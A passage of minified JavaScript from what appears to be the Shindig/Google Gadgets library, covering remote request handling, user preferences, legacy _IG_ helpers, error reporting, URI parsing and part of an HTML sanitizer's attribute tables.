}d[a]=(typeof b==="string")?b:gadgets.json.stringify(b)
}}return d
};;
gadgets.io=function(){var config={};
var oauthState;
function makeXhr(){var x;
var wrapperXhr=window.shindig&&window.shindig["xhrwrapper"]&&window.shindig["xhrwrapper"]["createXHR"];
if(wrapperXhr){return wrapperXhr()
}else{if(typeof ActiveXObject!="undefined"){x=new ActiveXObject("Msxml2.XMLHTTP");
if(!x){x=new ActiveXObject("Microsoft.XMLHTTP")
}return x
}else{if(typeof XMLHttpRequest!="undefined"||window.XMLHttpRequest){return new window.XMLHttpRequest()
}else{throw ("no xhr available")
}}}}function hadError(xobj,callback){if(xobj.readyState!==4){return true
}try{if(xobj.status!==200){var error=(""+xobj.status);
if(xobj.responseText){error=error+" "+xobj.responseText
}callback({errors:[error],rc:xobj.status,text:xobj.responseText});
return true
}}catch(e){callback({errors:[e.number+" Error not specified"],rc:e.number,text:e.description});
return true
}return false
}function processNonProxiedResponse(url,callback,params,xobj){if(hadError(xobj,callback)){return
}var data={body:xobj.responseText};
callback(transformResponseData(params,data))
}var UNPARSEABLE_CRUFT="throw 1; < don't be evil' >";
function processResponse(url,callback,params,xobj){if(hadError(xobj,callback)){return
}var txt=xobj.responseText;
var offset=txt.indexOf(UNPARSEABLE_CRUFT)+UNPARSEABLE_CRUFT.length;
if(offset<UNPARSEABLE_CRUFT.length){return
}txt=txt.substr(offset);
var data=eval("("+txt+")");
data=data[url];
if(data.oauthState){oauthState=data.oauthState
}if(data.st){shindig.auth.updateSecurityToken(data.st)
}callback(transformResponseData(params,data))
}function transformResponseData(params,data){var resp={text:data.body,rc:data.rc||200,headers:data.headers,oauthApprovalUrl:data.oauthApprovalUrl,oauthError:data.oauthError,oauthErrorText:data.oauthErrorText,errors:[]};
if(resp.rc<200||resp.rc>=400){resp.errors=[resp.rc+" Error"]
}else{if(resp.text){if(resp.rc>=300&&resp.rc<400){params.CONTENT_TYPE="TEXT"
}switch(params.CONTENT_TYPE){case"JSON":case"FEED":resp.data=gadgets.json.parse(resp.text);
if(!resp.data){resp.errors.push("500 Failed to parse JSON");
resp.rc=500;
resp.data=null
}break;
case"DOM":var dom;
if(typeof ActiveXObject!="undefined"){dom=new ActiveXObject("Microsoft.XMLDOM");
dom.async=false;
dom.validateOnParse=false;
dom.resolveExternals=false;
if(!dom.loadXML(resp.text)){resp.errors.push("500 Failed to parse XML");
resp.rc=500
}else{resp.data=dom
}}else{var parser=new DOMParser();
dom=parser.parseFromString(resp.text,"text/xml");
if("parsererror"===dom.documentElement.nodeName){resp.errors.push("500 Failed to parse XML");
resp.rc=500
}else{resp.data=dom
}}break;
default:resp.data=resp.text;
break
}}}return resp
}function makeXhrRequest(realUrl,proxyUrl,callback,paramData,method,params,processResponseFunction,opt_headers){var xhr=makeXhr();
if(proxyUrl.indexOf("//")==0){proxyUrl=document.location.protocol+proxyUrl
}xhr.open(method,proxyUrl,true);
if(callback){xhr.onreadystatechange=gadgets.util.makeClosure(null,processResponseFunction,realUrl,callback,params,xhr)
}if(paramData!==null){var contentTypeHeader="Content-Type";
var contentType="application/x-www-form-urlencoded";
if(typeof opt_headers==="string"){contentType=opt_headers;
opt_headers={}
}var headers=opt_headers||{};
if(!headers[contentTypeHeader]){headers[contentTypeHeader]=contentType
}for(var headerName in headers){xhr.setRequestHeader(headerName,headers[headerName])
}}xhr.send(paramData)
}function respondWithPreload(postData,params,callback){if(gadgets.io.preloaded_&&postData.httpMethod==="GET"){for(var i=0;
i<gadgets.io.preloaded_.length;
i++){var preload=gadgets.io.preloaded_[i];
if(preload&&(preload.id===postData.url)){delete gadgets.io.preloaded_[i];
if(preload.rc!==200){callback({rc:preload.rc,errors:[preload.rc+" Error"]})
}else{if(preload.oauthState){oauthState=preload.oauthState
}var resp={body:preload.body,rc:preload.rc,headers:preload.headers,oauthApprovalUrl:preload.oauthApprovalUrl,oauthError:preload.oauthError,oauthErrorText:preload.oauthErrorText,errors:[]};
callback(transformResponseData(params,resp))
}return true
}}}return false
}function init(configuration){config=configuration["core.io"]||{}
}gadgets.config.register("core.io",null,init);
return{makeRequest:function(url,callback,opt_params){var params=opt_params||{};
var httpMethod=params.METHOD||"GET";
var refreshInterval=params.REFRESH_INTERVAL;
var auth,st;
if(params.AUTHORIZATION&&params.AUTHORIZATION!=="NONE"){auth=params.AUTHORIZATION.toLowerCase();
st=shindig.auth.getSecurityToken()
}else{if(httpMethod==="GET"&&refreshInterval===undefined){refreshInterval=3600
}}var signOwner=true;
if(typeof params.OWNER_SIGNED!=="undefined"){signOwner=params.OWNER_SIGNED
}var signViewer=true;
if(typeof params.VIEWER_SIGNED!=="undefined"){signViewer=params.VIEWER_SIGNED
}var headers=params.HEADERS||{};
if(httpMethod==="POST"&&!headers["Content-Type"]){headers["Content-Type"]="application/x-www-form-urlencoded"
}var urlParams=gadgets.util.getUrlParameters();
var paramData={url:url,httpMethod:httpMethod,headers:gadgets.io.encodeValues(headers,false),postData:params.POST_DATA||"",authz:auth||"",st:st||"",contentType:params.CONTENT_TYPE||"TEXT",numEntries:params.NUM_ENTRIES||"3",getSummaries:!!params.GET_SUMMARIES,signOwner:signOwner,signViewer:signViewer,gadget:urlParams.url,container:urlParams.container||urlParams.synd||"default",bypassSpecCache:gadgets.util.getUrlParameters()["nocache"]||"",getFullHeaders:!!params.GET_FULL_HEADERS};
if(auth==="oauth"||auth==="signed"){if(gadgets.io.oauthReceivedCallbackUrl_){paramData.OAUTH_RECEIVED_CALLBACK=gadgets.io.oauthReceivedCallbackUrl_;
gadgets.io.oauthReceivedCallbackUrl_=null
}paramData.oauthState=oauthState||"";
for(var opt in params){if(params.hasOwnProperty(opt)){if(opt.indexOf("OAUTH_")===0){paramData[opt]=params[opt]
}}}}var proxyUrl=config.jsonProxyUrl.replace("%host%",document.location.host);
if(!respondWithPreload(paramData,params,callback)){if(httpMethod==="GET"&&refreshInterval>0){var extraparams="?refresh="+refreshInterval+"&"+gadgets.io.encodeValues(paramData);
makeXhrRequest(url,proxyUrl+extraparams,callback,null,"GET",params,processResponse)
}else{makeXhrRequest(url,proxyUrl,callback,gadgets.io.encodeValues(paramData),"POST",params,processResponse)
}}},makeNonProxiedRequest:function(relativeUrl,callback,opt_params,opt_headers){var params=opt_params||{};
makeXhrRequest(relativeUrl,relativeUrl,callback,params.POST_DATA,params.METHOD,params,processNonProxiedResponse,opt_headers)
},clearOAuthState:function(){oauthState=undefined
},encodeValues:function(fields,opt_noEscaping){var escape=!opt_noEscaping;
var buf=[];
var first=false;
for(var i in fields){if(fields.hasOwnProperty(i)&&!/___$/.test(i)){if(!first){first=true
}else{buf.push("&")
}buf.push(escape?encodeURIComponent(String(i)):i);
buf.push("=");
buf.push(escape?encodeURIComponent(String(fields[i])):fields[i])
}}return buf.join("")
},getProxyUrl:function(url,opt_params){var params=opt_params||{};
var refresh=params.REFRESH_INTERVAL;
if(refresh===undefined){refresh="3600"
}var urlParams=gadgets.util.getUrlParameters();
var rewriteMimeParam=params.rewriteMime?"&rewriteMime="+encodeURIComponent(String(params.rewriteMime)):"";
var ret=config.proxyUrl.replace("%url%",encodeURIComponent(url)).replace("%host%",document.location.host).replace("%rawurl%",url).replace("%refresh%",encodeURIComponent(String(refresh))).replace("%gadget%",encodeURIComponent(urlParams.url)).replace("%container%",encodeURIComponent(urlParams.container||urlParams.synd||"default")).replace("%rewriteMime%",rewriteMimeParam);
if(ret.indexOf("//")==0){ret=window.location.protocol+ret
}return ret
}}
}();
gadgets.io.RequestParameters=gadgets.util.makeEnum(["METHOD","CONTENT_TYPE","POST_DATA","HEADERS","AUTHORIZATION","NUM_ENTRIES","GET_SUMMARIES","GET_FULL_HEADERS","REFRESH_INTERVAL","OAUTH_SERVICE_NAME","OAUTH_USE_TOKEN","OAUTH_TOKEN_NAME","OAUTH_REQUEST_TOKEN","OAUTH_REQUEST_TOKEN_SECRET","OAUTH_RECEIVED_CALLBACK"]);
gadgets.io.MethodType=gadgets.util.makeEnum(["GET","POST","PUT","DELETE","HEAD"]);
gadgets.io.ContentType=gadgets.util.makeEnum(["TEXT","DOM","JSON","FEED"]);
gadgets.io.AuthorizationType=gadgets.util.makeEnum(["NONE","SIGNED","OAUTH"]);;
tamings___.push(function(a){caja___.whitelistFuncs([[gadgets.io,"encodeValues"],[gadgets.io,"getProxyUrl"],[gadgets.io,"makeRequest"]])
});;
(function(){var i=null;
var j={};
var f=gadgets.util.escapeString;
var d={};
var h={};
var e="en";
var b="US";
var a=0;
function c(){var l=gadgets.util.getUrlParameters();
for(var k in l){if(l.hasOwnProperty(k)){if(k.indexOf("up_")===0&&k.length>3){j[k.substr(3)]=String(l[k])
}else{if(k==="country"){b=l[k]
}else{if(k==="lang"){e=l[k]
}else{if(k==="mid"){a=l[k]
}}}}}}}function g(){for(var k in h){if(typeof j[k]==="undefined"){j[k]=h[k]
}}}gadgets.Prefs=function(){if(!i){c();
g();
i=this
}return i
};
gadgets.Prefs.setInternal_=function(n,p){var o=false;
if(typeof n==="string"){if(!j.hasOwnProperty(n)||j[n]!==p){o=true
}j[n]=p
}else{for(var m in n){if(n.hasOwnProperty(m)){var l=n[m];
if(!j.hasOwnProperty(m)||j[m]!==l){o=true
}j[m]=l
}}}return o
};
gadgets.Prefs.setMessages_=function(k){d=k
};
gadgets.Prefs.setDefaultPrefs_=function(k){h=k
};
gadgets.Prefs.prototype.getString=function(k){if(k===".lang"){k="lang"
}return j[k]?f(j[k]):""
};
gadgets.Prefs.prototype.setDontEscape_=function(){f=function(l){return l
}
};
gadgets.Prefs.prototype.getInt=function(k){var l=parseInt(j[k],10);
return isNaN(l)?0:l
};
gadgets.Prefs.prototype.getFloat=function(k){var l=parseFloat(j[k]);
return isNaN(l)?0:l
};
gadgets.Prefs.prototype.getBool=function(k){var l=j[k];
if(l){return l==="true"||l===true||!!parseInt(l,10)
}return false
};
gadgets.Prefs.prototype.set=function(k,l){throw new Error("setprefs feature required to make this call.")
};
gadgets.Prefs.prototype.getArray=function(n){var o=j[n];
if(o){var k=o.split("|");
for(var m=0,l=k.length;
m<l;
++m){k[m]=f(k[m].replace(/%7C/g,"|"))
}return k
}return[]
};
gadgets.Prefs.prototype.setArray=function(k,l){throw new Error("setprefs feature required to make this call.")
};
gadgets.Prefs.prototype.getMsg=function(k){return d[k]||""
};
gadgets.Prefs.prototype.getCountry=function(){return b
};
gadgets.Prefs.prototype.getLang=function(){return e
};
gadgets.Prefs.prototype.getModuleId=function(){return a
}
})();;
tamings___.push(function(a){caja___.whitelistCtors([[gadgets,"Prefs",Object]]);
caja___.whitelistMeths([[gadgets.Prefs,"getArray"],[gadgets.Prefs,"getBool"],[gadgets.Prefs,"getCountry"],[gadgets.Prefs,"getFloat"],[gadgets.Prefs,"getInt"],[gadgets.Prefs,"getLang"],[gadgets.Prefs,"getMsg"],[gadgets.Prefs,"getString"],[gadgets.Prefs,"set"],[gadgets.Prefs,"setArray"]])
});;
var JSON=window.JSON||gadgets.json;
var _IG_Prefs=(function(){var a=null;
var b=function(){if(!a){a=new gadgets.Prefs();
a.setDontEscape_()
}return a
};
b._parseURL=gadgets.Prefs.parseUrl;
return b
})();
function _IG_Fetch_wrapper(b,a){b(a.data?a.data:"")
}function _IG_FetchContent(b,g,c){var f=c||{};
if(f.refreshInterval){f.REFRESH_INTERVAL=f.refreshInterval
}else{f.REFRESH_INTERVAL=3600
}for(var e in f){var d=f[e];
delete f[e];
f[e.toUpperCase()]=d
}var a=gadgets.util.makeClosure(null,_IG_Fetch_wrapper,g);
gadgets.io.makeRequest(b,a,f)
}function _IG_FetchXmlContent(b,e,c){var d=c||{};
if(d.refreshInterval){d.REFRESH_INTERVAL=d.refreshInterval
}else{d.REFRESH_INTERVAL=3600
}d.CONTENT_TYPE="DOM";
var a=gadgets.util.makeClosure(null,_IG_Fetch_wrapper,e);
gadgets.io.makeRequest(b,a,d)
}function _IG_FetchFeedAsJSON(b,f,c,a,d){var e=d||{};
e.CONTENT_TYPE="FEED";
e.NUM_ENTRIES=c;
e.GET_SUMMARIES=a;
gadgets.io.makeRequest(b,function(j){j.data=j.data||{};
if(j.errors&&j.errors.length>0){j.data.ErrorMsg=j.errors[0]
}if(j.data.link){j.data.URL=b
}if(j.data.title){j.data.Title=j.data.title
}if(j.data.description){j.data.Description=j.data.description
}if(j.data.link){j.data.Link=j.data.link
}if(j.data.items&&j.data.items.length>0){j.data.Entry=j.data.items;
for(var h=0;
h<j.data.Entry.length;
++h){var i=j.data.Entry[h];
i.Title=i.title;
i.Link=i.link;
i.Summary=i.summary||i.description;
i.Date=i.pubDate
}}for(var g=0;
g<j.data.Entry.length;
++g){var i=j.data.Entry[g];
i.Date=(i.Date/1000)
}f(j.data)
},e)
}function _IG_GetCachedUrl(a,b){var c=b||{};
c.REFRESH_INTERVAL=3600;
if(c.refreshInterval){c.REFRESH_INTERVAL=c.refreshInterval
}return gadgets.io.getProxyUrl(a,c)
}function _IG_GetImageUrl(a,b){return _IG_GetCachedUrl(a,b)
}function _IG_GetImage(b){var a=document.createElement("img");
a.src=_IG_GetCachedUrl(b);
return a
}function _IG_RegisterOnloadHandler(a){gadgets.util.registerOnLoadHandler(a)
}function _IG_Callback(b,c){var a=arguments;
return function(){var d=Array.prototype.slice.call(arguments);
b.apply(null,d.concat(Array.prototype.slice.call(a,1)))
}
}var _args=gadgets.util.getUrlParameters;
function _gel(a){return document.getElementById?document.getElementById(a):null
}function _gelstn(a){if(a==="*"&&document.all){return document.all
}return document.getElementsByTagName?document.getElementsByTagName(a):[]
}function _gelsbyregex(d,f){var c=_gelstn(d);
var e=[];
for(var b=0,a=c.length;
b<a;
++b){if(f.test(c[b].id)){e.push(c[b])
}}return e
}function _esc(a){return window.encodeURIComponent?encodeURIComponent(a):escape(a)
}function _unesc(a){return window.decodeURIComponent?decodeURIComponent(a):unescape(a)
}function _hesc(a){return gadgets.util.escapeString(a)
}function _striptags(a){return a.replace(/<\/?[^>]+>/g,"")
}function _trim(a){return a.replace(/^\s+|\s+$/g,"")
}function _toggle(a){a=(typeof a==="string")?_gel(a):a;
if(a!==null){if(a.style.display.length===0||a.style.display==="block"){a.style.display="none"
}else{if(a.style.display==="none"){a.style.display="block"
}}}}var _uid=(function(){var a=0;
return function(){return a++
}
})();
function _min(d,c){return(d<c?d:c)
}function _max(d,c){return(d>c?d:c)
}function _exportSymbols(a,c){var m=window;
var f=a.split(".");
for(var h=0,g=f.length;
h<g;
h++){var b=f[h];
m[b]=m[b]||{};
m=m[b]
}for(var e=0,d=c.length;
e<d;
e+=2){m[c[e]]=c[e+1]
}}function _IG_AddDOMEventHandler(c,b,a){gadgets.warn("_IG_AddDOMEventHandler not implemented - see SHINDIG-198")
};;
(function(){function f(b,c,a){b={msg:b||"",line:a||0,jsUrl:0==window.location.href.indexOf(c)?"-top-":c,fullUrl:window.location};try{if(++window._varz_numerrors,gadgets&&!(3<e)){c={};c[gadgets.io.RequestParameters.METHOD]=gadgets.io.MethodType.GET;a=encodeURIComponent||escape;var d=gadgets.util.getUrlParameters(),g=d.container||d.synd,h=d.gadget||d.url,l=["/gadgets/evthdlr?t=err&gadget=",a(h),"&container=",a(g),"&jsurl=",a(b.jsUrl),"&line=",a(b.line),"&session=",k,"&count=",e,"&msg=",a(b.msg)];gadgets.io.makeNonProxiedRequest(l.join(""),
null,c);e++}}catch(m){}}window._varz_numerrors=0;var k=(new Date).getTime(),e=0;-1==window.location.href.indexOf("&debug=1")&&-1==window.location.href.indexOf("?debug=1")&&(window.onerror=f)})();
;
(function(){var l=null,q=function(){function e(a){a=(""+a).match(w);return!a?l:new b(p(a[1]),p(a[2]),p(a[3]),p(a[4]),p(a[5]),p(a[6]),p(a[7]))}function x(a,e){return"string"==typeof a?encodeURI(a).replace(e,y):l}function y(a){a=a.charCodeAt(0);return"%"+"0123456789ABCDEF".charAt(a>>4&15)+"0123456789ABCDEF".charAt(a&15)}function u(a){if(a===l)return l;for(var a=a.replace(/(^|\/)\.(?:\/|$)/g,"$1").replace(/\/{2,}/g,"/"),e=z,m;(m=a.replace(e,"$1"))!=a;a=m);return a}function v(a,e){var m=a.R(),b=e.K();b?m.fa(e.j):
b=e.V();b?m.ca(e.n):b=e.W();b?m.da(e.k):b=e.Y();var s=e.g,g=u(s);if(b)m.ba(e.T()),g=g&&g.replace(j,"");else if(b=!!s){if(47!==g.charCodeAt(0))var g=u(m.g||"").replace(j,""),p=g.lastIndexOf("/")+1,g=u((p?g.substring(0,p):"")+u(s)).replace(j,"")}else g=g&&g.replace(j,""),g!==s&&m.G(g);b?m.G(g):b=e.Z();b?m.M(e.l):b=e.X();b&&m.ea(e.o);return m}function b(a,e,b,j,s,g,p){this.j=a;this.n=e;this.k=b;this.h=j;this.g=s;this.l=g;this.o=p}function p(a){return"string"==typeof a&&0<a.length?a:l}var z=RegExp(/(\/|^)(?:[^./][^/]*|\.{2,}(?:[^./][^/]*)|\.{3,}[^/]*)\/\.\.(?:\/|$)/),
j=/^(?:\.\.\/)*(?:\.\.$)?/;b.prototype.toString=function(){var a=[];l!==this.j&&a.push(this.j,":");l!==this.k&&(a.push("//"),l!==this.n&&a.push(this.n,"@"),a.push(this.k),l!==this.h&&a.push(":",this.h.toString()));l!==this.g&&a.push(this.g);l!==this.l&&a.push("?",this.l);l!==this.o&&a.push("#",this.o);return a.join("")};b.prototype.R=function(){return new b(this.j,this.n,this.k,this.h,this.g,this.l,this.o)};b.prototype.U=function(){return this.j&&decodeURIComponent(this.j).toLowerCase()};b.prototype.fa=
function(a){this.j=a?a:l};b.prototype.K=function(){return l!==this.j};b.prototype.ca=function(a){this.n=a?a:l};b.prototype.V=function(){return l!==this.n};b.prototype.da=function(a){this.k=a?a:l;this.G(this.g)};b.prototype.W=function(){return l!==this.k};b.prototype.T=function(){return this.h&&decodeURIComponent(this.h)};b.prototype.ba=function(a){if(a){a=Number(a);if(a!==(a&65535))throw Error("Bad port number "+a);this.h=""+a}else this.h=l};b.prototype.Y=function(){return l!==this.h};b.prototype.S=
function(){return this.g&&decodeURIComponent(this.g)};b.prototype.G=function(a){a?(a=""+a,this.g=!this.k||/^\//.test(a)?a:"/"+a):this.g=l};b.prototype.M=function(a){this.l=a?a:l};b.prototype.Z=function(){return l!==this.l};b.prototype.aa=function(a){if("object"===typeof a&&!(a instanceof Array)&&(a instanceof Object||"[object Array]"!==Object.prototype.toString.call(a))){var e=[],b=-1,j;for(j in a){var s=a[j];"string"===typeof s&&(e[++b]=j,e[++b]=s)}a=e}for(var e=[],b="",g=0;g<a.length;)j=a[g++],
s=a[g++],e.push(b,encodeURIComponent(j.toString())),b="&",s&&e.push("=",encodeURIComponent(s.toString()));this.l=e.join("")};b.prototype.ea=function(a){this.o=a?a:l};b.prototype.X=function(){return l!==this.o};var w=/^(?:([^:/?#]+):)?(?:\/\/(?:([^/?#]*)@)?([^/?#:@]*)(?::([0-9]+))?)?([^?#]+)?(?:\?([^#]*))?(?:#(.*))?$/,B=/[#\/\?@]/g,C=/[\#\?]/g;b.parse=e;b.create=function(a,e,j,p,s,g,u){a=new b(x(a,B),x(e,B),"string"==typeof j?encodeURIComponent(j):l,0<p?p.toString():l,x(s,C),l,"string"==typeof u?encodeURIComponent(u):
l);g&&("string"===typeof g?a.M(g.replace(/[^?&=0-9A-Za-z_\-~.%]/g,y)):a.aa(g));return a};b.$=v;b.ja=u;b.va={pa:function(a){return/\.html$/.test(e(a).S())?"text/html":"application/javascript"},$:function(a,b){return a?v(e(a),e(b)).toString():""+b}};return b}();"undefined"!==typeof window&&(window.URI=q);var M={f:{NONE:0,URI:1,URI_FRAGMENT:11,SCRIPT:2,STYLE:3,HTML:12,ID:4,IDREF:5,IDREFS:6,GLOBAL_NAME:7,LOCAL_NAME:8,CLASSES:9,FRAME_TARGET:10,MEDIA_QUERY:13}};M.atype=M.f;
M.w={"*::class":9,"*::dir":0,"*::draggable":0,"*::hidden":0,"*::id":4,"*::inert":0,"*::itemprop":0,"*::itemref":6,"*::itemscope":0,"*::lang":0,"*::onblur":2,"*::onchange":2,"*::onclick":2,"*::ondblclick":2,"*::onerror":2,"*::onfocus":2,"*::onkeydown":2,"*::onkeypress":2,"*::onkeyup":2,"*::onload":2,"*::onmousedown":2,"*::onmousemove":2,"*::onmouseout":2,"*::onmouseover":2,"*::onmouseup":2,"*::onreset":2,"*::onscroll":2,"*::onselect":2,"*::onsubmit":2,"*::ontouchcancel":2,"*::ontouchend":2,"*::ontouchenter":2,
"*::ontouchleave":2,"*::ontouchmove":2,"*::ontouchstart":2,"*::onunload":2,"*::spellcheck":0,"*::style":3,"*::tabindex":0,"*::title":0,"*::translate":0,"a::accesskey":0,"a::coords":0,"a::href":1,"a::hreflang":0,"a::name":7,"a::onblur":2,"a::onfocus":2,"a::shape":0,"a::target":10,"a::type":0,"area::accesskey":0,"area::alt":0,"area::coords":0,"area::href":1,"area::nohref":0,"area::onblur":2,"area::onfocus":2,"area::shape":0,"area::target":10,"audio::controls":0,"audio::loop":0,"audio::mediagroup":5,
"audio::muted":0,"audio::preload":0,"audio::src":1,"bdo::dir":0,"blockquote::cite":1,"br::clear":0,"button::accesskey":0,"button::disabled":0,"button::name":8,"button::onblur":2,"button::onfocus":2,"button::type":0,"button::value":0,"canvas::height":0,"canvas::width":0,"caption::align":0,"col::align":0,"col::char":0,"col::charoff":0,"col::span":0,"col::valign":0,"col::width":0,"colgroup::align":0,"colgroup::char":0,"colgroup::charoff":0,"colgroup::span":0,"colgroup::valign":0,"colgroup::width":0,
"command::checked":0,"command::command":5,"command::disabled":0,"command::icon":1,"command::label":0,"command::radiogroup":0,"command::type":0,"data::value":0,"del::cite":1,"del::datetime":0,"details::open":0,"dir::compact":0,"div::align":0,"dl::compact":0,"fieldset::disabled":0,"font::color":0,"font::face":0,"font::size":0,"form::accept":0,"form::action":1,"form::autocomplete":0,"form::enctype":0,"form::method":0,"form::name":7,"form::novalidate":0,"form::onreset":2,"form::onsubmit":2,"form::target":10,
"h1::align":0,"h2::align":0,"h3::align":0,"h4::align":0,"h5::align":0,"h6::align":0,"hr::align":0,"hr::noshade":0,"hr::size":0,"hr::width":0,"iframe::align":0,"iframe::frameborder":0,"iframe::height":0,"iframe::marginheight":0,"iframe::marginwidth":0,"iframe::width":0,"img::align":0,"img::alt":0,"img::border":0,"img::height":0,"img::hspace":0,"img::ismap":0,"img::name":7,"img::src":1,"img::usemap":11,"img::vspace":0,"img::width":0,"input::accept":0,"input::accesskey":0,"input::align":0,"input::alt":0,
"input::autocomplete":0,"input::checked":0,"input::disabled":0,"input::inputmode":0,"input::ismap":0,"input::list":5,"input::max":0,"input::maxlength":0,"input::min":0,"input::multiple":0,"input::name":8,"input::onblur":2,"input::onchange":2,"input::onfocus":2,"input::onselect":2,"input::pattern":0,"input::placeholder":0,"input::readonly":0,"input::required":0,"input::size":0,"input::src":1,"input::step":0,"input::type":0,"input::usemap":11,"input::value":0,"ins::cite":1,"ins::datetime":0,"label::accesskey":0,
"label::for":5,"label::onblur":2,"label::onfocus":2,"legend::accesskey":0,"legend::align":0,"li::type":0,"li::value":0,"map::name":7,"menu::compact":0,"menu::label":0,"menu::type":0,"meter::high":0,"meter::low":0,"meter::max":0,"meter::min":0,"meter::optimum":0,"meter::value":0,"ol::compact":0,"ol::reversed":0,"ol::start":0,"ol::type":0,"optgroup::disabled":0,"optgroup::label":0,"option::disabled":0,"option::label":0,"option::selected":0,"option::value":0,"output::for":6,"output::name":8,"p::align":0,
"pre::width":0,"progress::max":0,"progress::min":0,"progress::value":0,"q::cite":1,"select::autocomplete":0,"select::disabled":0,"select::multiple":0,"select::name":8,"select::onblur":2,"select::onchange":2,"select::onfocus":2,"select::required":0,"select::size":0,"source::type":0,"table::align":0,"table::bgcolor":0,"table::border":0,"table::cellpadding":0,"table::cellspacing":0,"table::frame":0,"table::rules":0,"table::summary":0,"table::width":0,"tbody::align":0,"tbody::char":0,"tbody::charoff":0,
"tbody::valign":0,"td::abbr":0,"td::align":0,"td::axis":0,"td::bgcolor":0,"td::char":0,"td::charoff":0,"td::colspan":0,"td::headers":6,"td::height":0,"td::nowrap":0,"td::rowspan":0,"td::scope":0,"td::valign":0,"td::width":0,"textarea::accesskey":0,"textarea::autocomplete":0,"textarea::cols":0,"textarea::disabled":0,"textarea::inputmode":0,"textarea::name":8,"textarea::onblur":2,"textarea::onchange":2,"textarea::onfocus":2,"textarea::onselect":2,"textarea::placeholder":0,"textarea::readonly":0,"textarea::required":0,
"textarea::rows":0,"textarea::wrap":0,"tfoot::align":0,"tfoot::char":0,"tfoot::charoff":0,"tfoot::valign":0,"th::abbr":0,"th::align":0,"th::axis":0,"th::bgcolor":0,"th::char":0,"th::charoff":0,"th::colspan":0,"th::headers":6,"th::height":0,"th::nowrap":0,"th::rowspan":0,"th::scope":0,"th::valign":0,"th::width":0,"thead::align":0,"thead::char":0,"thead::charoff":0,"thead::valign":0,"tr::align":0,"tr::bgcolor":0,"tr::char":0,"tr::charoff":0,"tr::valign":0,"track::default":0,"track::kind":0,"track::label":0,
"track::srclang":0,"ul::compact":0,"ul::type":0,"video::controls":0,"video::height":0,"video::loop":0,"video::mediagroup":5,"video::muted":0,"video::poster":1,"video::preload":0,"video::src":1,"video::width":0};M.ATTRIBS=M.w;M.c={OPTIONAL_ENDTAG:1,EMPTY:2,CDATA:4,RCDATA:8,UNSAFE:16,FOLDABLE:32,SCRIPT:64,STYLE:128,VIRTUALIZED:256};M.eflags=M.c;
M.e={a:0,abbr:0,acronym:0,address:0,applet:272,area:2,article:0,aside:0,audio:0,b:0,base:274,basefont:274,bdi:0,bdo:0,big:0,blockquote:0,body:305,br:2,button:0,canvas:0,caption:0,center:0,cite:0,code:0,col:2,colgroup:1,command:2,data:0,datalist:0,dd:1,del:0,details:0,dfn:0,dialog:272,dir:0,div:0,dl:0,dt:1,em:0,fieldset:0,figcaption:0,figure:0,font:0,footer:0,form:0,frame:274,frameset:272,h1:0,h2:0,h3:0,h4:0,h5:0,h6:0,head:305,header:0,hgroup:0,hr:2,html:305,i:0,iframe:4,img:2,input:2,ins:0,isindex:274,
kbd:0,keygen:274,label:0,legend:0,li:1,link:274,map:0,mark:0,menu:0,meta:274,meter:0,nav:0,nobr:0,noembed:276,noframes:276,noscript:276,object:272,ol:0,optgroup:0,option:1,output:0,p:1,param:274,pre:0,progress:0,q:0,s:0,samp:0,script:84,section:0,select:0,small:0,source:2,span:0,strike:0,strong:0,style:148,sub:0,summary:0,sup:0,table:0,tbody:1,td:1,textarea:8,tfoot:1,th:1,thead:1,time:0,title:280,tr:1,track:2,tt:0,u:0,ul:0,"var":0,video:0,wbr:2};M.ELEMENTS=M.e;
M.O={a:"HTMLAnchorElement",abbr:"HTMLElement",acronym:"HTMLElement",address:"HTMLElement",applet:"HTMLAppletElement",area:"HTMLAreaElement",article:"HTMLElement",aside:"HTMLElement",audio:"HTMLAudioElement",b:"HTMLElement",base:"HTMLBaseElement",basefont:"HTMLBaseFontElement",bdi:"HTMLElement",bdo:"HTMLElement",big:"HTMLElement",blockquote:"HTMLQuoteElement",body:"HTMLBodyElement",br:"HTMLBRElement",button:"HTMLButtonElement",canvas:"HTMLCanvasElement",caption:"HTMLTableCaptionElement",center:"HTMLElement",
cite:"HTMLElement",code:"HTMLElement",col:"HTMLTableColElement",colgroup:"HTMLTableColElement",command:"HTMLCommandElement",data:"HTMLElement",datalist:"HTMLDataListElement",dd:"HTMLElement",del:"HTMLModElement",details:"HTMLDetailsElement",dfn:"HTMLElement",dialog:"HTMLDialogElement",dir:"HTMLDirectoryElement",div:"HTMLDivElement",dl:"HTMLDListElement",dt:"HTMLElement",em:"HTMLElement",fieldset:"HTMLFieldSetElement",figcaption:"HTMLElement",figure:"HTMLElement",font:"HTMLFontElement",footer:"HTMLElement",
form:"HTMLFormElement",frame:"HTMLFrameElement",frameset:"HTMLFrameSetElement",h1:"HTMLHeadingElement",h2:"HTMLHeadingElement",h3:"HTMLHeadingElement",h4:"HTMLHeadingElement",h5:"HTMLHeadingElement",h6:"HTMLHeadingElement",head:"HTMLHeadElement",header:"HTMLElement",hgroup:"HTMLElement",hr:"HTMLHRElement",html:"HTMLHtmlElement",i:"HTMLElement",iframe:"HTMLIFrameElement",img:"HTMLImageElement",input:"HTMLInputElement",ins:"HTMLModElement",isindex:"HTMLUnknownElement",kbd:"HTMLElement",keygen:"HTMLKeygenElement",
label:"HTMLLabelElement",legend:"HTMLLegendElement",li:"HTMLLIElement",link:"HTMLLinkElement",map:"HTMLMapElement",mark:"HTMLElement",menu:"HTMLMenuElement",meta:"HTMLMetaElement",meter:"HTMLMeterElement",nav:"HTMLElement",nobr:"HTMLElement",noembed:"HTMLElement",noframes:"HTMLElement",noscript:"HTMLElement",object:"HTMLObjectElement",ol:"HTMLOListElement",optgroup:"HTMLOptGroupElement",option:"HTMLOptionElement",output:"HTMLOutputElement",p:"HTMLParagraphElement",param:"HTMLParamElement",pre:"HTMLPreElement",
progress:"HTMLProgressElement",q:"HTMLQuoteElement",s:"HTMLElement",samp:"HTMLElement",script:"HTMLScriptElement",section:"HTMLElement",select:"HTMLSelectElement",small:"HTMLElement",source:"HTMLSourceElement",span:"HTMLSpanElement",strike:"HTMLElement",strong:"HTMLElement",style:"HTMLStyleElement",sub:"HTMLElement",summary:"HTMLElement",sup:"HTMLElement",table:"HTMLTableElement",tbody:"HTMLTableSectionElement",td:"HTMLTableDataCellElement",textarea:"HTMLTextAreaElement",tfoot:"HTMLTableSectionElement",
